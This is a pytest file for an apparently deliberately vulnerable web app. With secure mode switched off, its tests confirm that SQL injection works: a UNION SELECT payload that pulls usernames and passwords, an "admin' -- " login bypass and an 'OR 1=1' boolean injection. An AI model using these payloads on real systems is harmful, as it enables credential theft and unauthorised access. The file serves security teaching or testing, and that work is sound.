import pytest
from vuln_app.seed import init_db
from vuln_app.app import create_app


@pytest.fixture()
def client(tmp_path, monkeypatch):
    db = str(tmp_path / "app.db")
    init_db(db)
    monkeypatch.setenv("SECURE_MODE", "0")
    app = create_app(db)
    app.config.update(TESTING=True)
    return app.test_client()


def test_normal_search_works(client):
    r = client.get("/search?q=mouse")
    assert r.status_code == 200
    assert b"mouse" in r.data.lower()


def test_union_select_exfiltrates_users(client):
    payload = "' UNION SELECT id, username, password, 0 FROM users -- "
    r = client.get("/search", query_string={"q": payload})
    assert r.status_code == 200
    assert b"admin" in r.data
    assert b"s3cr3t-admin" in r.data


def test_login_auth_bypass(client):
    r = client.post("/login", data={"username": "admin' -- ", "password": "x"})
    assert r.status_code == 200
    assert b"welcome" in r.data.lower()


def test_product_boolean_injection(client):
    r = client.get("/product", query_string={"id": "5 OR 1=1"})
    assert r.status_code == 200
    # OR 1=1 returns more than one product row
    assert r.data.count(b"<tr") > 2
